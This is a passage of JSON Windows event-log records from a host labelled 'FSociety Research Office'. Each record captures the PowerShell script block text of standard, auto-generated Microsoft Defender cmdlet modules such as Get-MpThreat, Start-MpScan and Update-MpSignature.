$__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \n        }\n                    \n\n}\n                \n\nfunction Remove-MpThreat\n{\n    [CmdletBinding(PositionalBinding=$false)]\n    \n    \n    param(\n    \n    [Parameter(ParameterSetName='Remove0')]\n    [Alias('Session')]\n    [ValidateNotNullOrEmpty()]\n    [CimSession[]]\n    ${CimSession},\n\n    [Parameter(ParameterSetName='Remove0')]\n    [int]\n    ${ThrottleLimit},\n\n    [Parameter(ParameterSetName='Remove0')]\n    [switch]\n    ${AsJob})\n\n    DynamicParam {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\n\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\n                {\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\n                }\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n\n    Begin {\n        $__cmdletization_exceptionHasBeenThrown = $false\n        try \n        {\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\n            $__cmdletization_objectModelWrapper.BeginProcessing()\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    Process {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\n\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Remove', $__cmdletization_methodParameters, $__cmdletization_returnValue)\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\n\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    End {\n        try\n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper.EndProcessing()\n            }\n        }\n        catch\n        {\n            throw\n        }\n    }\n\n    # .EXTERNALHELP MSFT_MpThreat.cdxml-Help.xml\n}\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Remove-MpThreat' -Alias '*'\n        \n\nfunction Get-MpThreat\n{\n    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]\n    \n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreat')]\n\n    param(\n    \n    [Parameter(ParameterSetName='ById')]\n    [Alias('ID')]\n    [ValidateNotNull()]\n    [long[]]\n    ${ThreatID},\n\n    [Parameter(ParameterSetName='ById')]\n    [Alias('Session')]\n    [ValidateNotNullOrEmpty()]\n    [CimSession[]]\n    ${CimSession},\n\n    [Parameter(ParameterSetName='ById')]\n    [int]\n    ${ThrottleLimit},\n\n    [Parameter(ParameterSetName='ById')]\n    [switch]\n    ${AsJob})\n\n    DynamicParam {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\n\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\n                {\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\n                }\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n\n    Begin {\n        $__cmdletization_exceptionHasBeenThrown = $false\n        try \n        {\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\n            $__cmdletization_objectModelWrapper.BeginProcessing()\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    Process {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\n    if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {\n        $__cmdletization_values = @(${ThreatID})\n        $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default')\n    }\n\n\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    End {\n        try\n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper.EndProcessing()\n            }\n        }\n        catch\n        {\n            throw\n        }\n    }\n\n    # .EXTERNALHELP MSFT_MpThreat.cdxml-Help.xml\n}\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-MpThreat' -Alias '*'\n        "}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"\n#requires -version 3.0\n\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\n\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\n\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreatCatalog'\n$script:ClassVersion = '1.0'\n$script:ModuleVersion = '1.0'\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\n\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\n\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\n        \n\nfunction __cmdletization_BindCommonParameters\n{\n    param(\n        $__cmdletization_objectModelWrapper,\n        $myPSBoundParameters\n    )       \n                \n\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \n        }\n                    \n\n}\n                \n\nfunction Get-MpThreatCatalog\n{\n    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]\n    \n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreatCatalog')]\n\n    param(\n    \n    [Parameter(ParameterSetName='ById')]\n    [Alias('ID')]\n    [ValidateNotNull()]\n    [long[]]\n    ${ThreatID},\n\n    [Parameter(ParameterSetName='ById')]\n    [Alias('Session')]\n    [ValidateNotNullOrEmpty()]\n    [CimSession[]]\n    ${CimSession},\n\n    [Parameter(ParameterSetName='ById')]\n    [int]\n    ${ThrottleLimit},\n\n    [Parameter(ParameterSetName='ById')]\n    [switch]\n    ${AsJob})\n\n    DynamicParam {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\n\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\n                {\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\n                }\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n\n    Begin {\n        $__cmdletization_exceptionHasBeenThrown = $false\n        try \n        {\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\n            $__cmdletization_objectModelWrapper.BeginProcessing()\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    Process {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\n    if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {\n        $__cmdletization_values = @(${ThreatID})\n        $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default')\n    }\n\n\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    End {\n        try\n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper.EndProcessing()\n            }\n        }\n        catch\n        {\n            throw\n        }\n    }\n\n    # .EXTERNALHELP MSFT_MpThreatCatalog.cdxml-Help.xml\n}\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-MpThreatCatalog' -Alias '*'\n        "}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"\n#requires -version 3.0\n\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\n\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\n\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreatDetection'\n$script:ClassVersion = '1.0'\n$script:ModuleVersion = '1.0'\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\n\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\n\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\n        \n\nfunction __cmdletization_BindCommonParameters\n{\n    param(\n        $__cmdletization_objectModelWrapper,\n        $myPSBoundParameters\n    )       \n                \n\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \n        }\n                    \n\n}\n                \n\nfunction Get-MpThreatDetection\n{\n    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]\n    \n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreatDetection')]\n\n    param(\n    \n    [Parameter(ParameterSetName='ById')]\n    [Alias('ID')]\n    [ValidateNotNull()]\n    [long[]]\n    ${ThreatID},\n\n    [Parameter(ParameterSetName='ById')]\n    [Alias('Session')]\n    [ValidateNotNullOrEmpty()]\n    [CimSession[]]\n    ${CimSession},\n\n    [Parameter(ParameterSetName='ById')]\n    [int]\n    ${ThrottleLimit},\n\n    [Parameter(ParameterSetName='ById')]\n    [switch]\n    ${AsJob})\n\n    DynamicParam {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\n\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\n                {\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\n                }\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n\n    Begin {\n        $__cmdletization_exceptionHasBeenThrown = $false\n        try \n        {\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\n            $__cmdletization_objectModelWrapper.BeginProcessing()\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    Process {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\n    if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {\n        $__cmdletization_values = @(${ThreatID})\n        $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default')\n    }\n\n\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    End {\n        try\n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper.EndProcessing()\n            }\n        }\n        catch\n        {\n            throw\n        }\n    }\n\n    # .EXTERNALHELP MSFT_MpThreatDetection.cdxml-Help.xml\n}\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-MpThreatDetection' -Alias '*'\n        "}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"\n#requires -version 3.0\n\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\n\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\n\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpScan'\n$script:ClassVersion = '1.0'\n$script:ModuleVersion = '1.0'\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\n\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\n\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\n        \n\nfunction __cmdletization_BindCommonParameters\n{\n    param(\n        $__cmdletization_objectModelWrapper,\n        $myPSBoundParameters\n    )       \n                \n\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \n        }\n                    \n\n}\n                \n\nfunction Start-MpScan\n{\n    [CmdletBinding(PositionalBinding=$false)]\n    \n    \n    param(\n    \n    [Parameter(ParameterSetName='Start0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string]\n    ${ScanPath},\n\n    [Parameter(ParameterSetName='Start0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('FullScan','QuickScan','CustomScan')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType]\n    ${ScanType},\n\n    [Parameter(ParameterSetName='Start0')]\n    [Alias('Session')]\n    [ValidateNotNullOrEmpty()]\n    [CimSession[]]\n    ${CimSession},\n\n    [Parameter(ParameterSetName='Start0')]\n    [int]\n    ${ThrottleLimit},\n\n    [Parameter(ParameterSetName='Start0')]\n    [switch]\n    ${AsJob})\n\n    DynamicParam {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\n\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\n                {\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\n                }\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n\n    Begin {\n        $__cmdletization_exceptionHasBeenThrown = $false\n        try \n        {\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\n            $__cmdletization_objectModelWrapper.BeginProcessing()\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    Process {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanPath')) {\n          [object]$__cmdletization_value = ${ScanPath}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanType')) {\n          [object]$__cmdletization_value = ${ScanType}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue)\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\n\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    End {\n        try\n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper.EndProcessing()\n            }\n        }\n        catch\n        {\n            throw\n        }\n    }\n\n    # .EXTERNALHELP MSFT_MpScan.cdxml-Help.xml\n}\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Start-MpScan' -Alias '*'\n        "}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"\n#requires -version 3.0\n\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\n\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\n\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpSignature'\n$script:ClassVersion = '1.0'\n$script:ModuleVersion = '1.0'\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\n\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\n\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\n        \n\nfunction __cmdletization_BindCommonParameters\n{\n    param(\n        $__cmdletization_objectModelWrapper,\n        $myPSBoundParameters\n    )       \n                \n\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \n        }\n                    \n\n}\n                \n\nfunction Update-MpSignature\n{\n    [CmdletBinding(PositionalBinding=$false)]\n    \n    \n    param(\n    \n    [Parameter(ParameterSetName='Update0')]\n    [AllowEmptyString()]\n    [AllowNull()]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('InternalDefinitionUpdateServer','MicrosoftUpdateServer','MMPC','FileShares')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource]\n    ${UpdateSource},\n\n    [Parameter(ParameterSetName='Update0')]\n    [Alias('Session')]\n    [ValidateNotNullOrEmpty()]\n    [CimSession[]]\n    ${CimSession},\n\n    [Parameter(ParameterSetName='Update0')]\n    [int]\n    ${ThrottleLimit},\n\n    [Parameter(ParameterSetName='Update0')]\n    [switch]\n    ${AsJob})\n\n    DynamicParam {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\n\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\n                {\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\n                }\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n\n    Begin {\n        $__cmdletization_exceptionHasBeenThrown = $false\n        try \n        {\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\n            $__cmdletization_objectModelWrapper.BeginProcessing()\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    Process {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('UpdateSource')) {\n          [object]$__cmdletization_value = ${UpdateSource}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UpdateSource'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UpdateSource'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Update', $__cmdletization_methodParameters, $__cmdletization_returnValue)\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\n\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    End {\n        try\n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper.EndProcessing()\n            }\n        }\n        catch\n        {\n            throw\n        }\n    }\n\n    # .EXTERNALHELP MSFT_MpSignature.cdxml-Help.xml\n}\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Update-MpSignature' -Alias '*'\n        "}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"\n#requires -version 3.0\n\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\n\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\n\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpWDOScan'\n$script:ClassVersion = '1.0'\n$script:ModuleVersion = '1.0'\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\n\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\n\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\n        \n\nfunction __cmdletization_BindCommonParameters\n{\n    param(\n        $__cmdletization_objectModelWrapper,\n        $myPSBoundParameters\n    )       \n                \n\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \n        }\n                    \n\n}\n                \n\nfunction Start-MpWDOScan\n{\n    [CmdletBinding(PositionalBinding=$false)]\n    \n    \n    param(\n    \n    [Parameter(ParameterSetName='Start0')]\n    [Alias('Session')]\n    [ValidateNotNullOrEmpty()]\n    [CimSession[]]\n    ${CimSession},\n\n    [Parameter(ParameterSetName='Start0')]\n    [int]\n    ${ThrottleLimit},\n\n    [Parameter(ParameterSetName='Start0')]\n    [switch]\n    ${AsJob})\n\n    DynamicParam {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, 